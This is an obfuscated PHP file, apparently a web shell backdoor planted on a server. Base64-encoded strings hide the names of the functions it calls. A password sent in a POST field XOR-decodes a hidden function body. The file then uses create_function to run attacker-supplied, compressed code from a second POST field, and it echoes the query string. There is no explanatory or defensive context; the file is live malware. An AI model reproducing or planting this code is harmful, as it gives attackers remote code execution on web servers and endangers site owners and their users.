<?php

class c62b03596a531d
{
    private $r62b03596a5883 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r62b03596a5883[$name], $args);
    }

    public function d62b03596a7412($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p62b03596a587e()
    {
        $qString = $this->d62b03596a7412("VnByWnBGaThuaXM9OjpRVUVSWV9TVFJJTkc=");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d62b03596a7412("cmFDd0NQTmxGeFcvVUFNbVZFYi9MQT09Ojpl");
        $p = $this->d62b03596a7412("cXVxUFdJeTNuaWRFcEdQQ2tpUzUxdz09Ojpw");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em62b03596a7418';
        $methodContent = 'U0QDXBtTTFgCaFNUTWlTEFdAHRBtUWodCg==';

        $base64decode = $this->d62b03596a7412("eXAya3IrMmZmdFVXaUFXdUV0a2g6OmJhc2U2NF9kZWNvZGU=");
        $createFunction = $this->d62b03596a7412("RllSVHVsWnBKTWQ5SVI4PTo6Y3JlYXRlX2Z1bmN0aW9u");
        $gzinflate = $this->d62b03596a7412("RmQycVJuYlM4TDZ3SXhqZUhDemI6Omd6aW5mbGF0ZQ==");
        $regex = $this->d62b03596a7412("Y2pWQ1J1VWVFWjc4azBCdk5BPT06Oi9eWyAtfl0rJC8=");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r62b03596a5883[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c62b03596a531d)->p62b03596a587e();

